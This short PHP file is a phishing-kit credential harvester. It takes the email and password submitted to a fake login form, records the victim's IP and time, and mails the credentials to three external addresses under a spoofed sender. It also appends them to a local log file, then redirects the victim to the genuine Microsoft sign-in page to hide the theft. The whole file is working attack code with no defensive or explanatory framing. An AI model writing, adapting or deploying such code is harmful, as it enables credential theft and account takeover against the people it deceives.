<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$email = $_REQUEST['login'];
$pwd = $_REQUEST['passwd'];

$buwhaha = "$adddate
$ip

Email: $email
Passwd: $pwd


knd were here
-----------------------------------";

$recipient = "sheikduniya@hotmail.com, sheikduniya@gmail.com, sheikduniya@yahoo.com";
$From = "account@inkfrogi.com";
$subj = "YANKEE CEO $email / $pwd";
$msg = "Login: $email\npass: $pwd\nip: $ip";
mail("$recipient", $subj, $msg, $From);


$file = fopen("log.txt", "a");
fputs ($file, "$buwhaha\r\n");
fclose ($file);

echo '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1250"><meta http-equiv="refresh" content="0; url=https://login.microsoftonline.com/"><title>Redirect</title></head><body></div></body></html>';
?>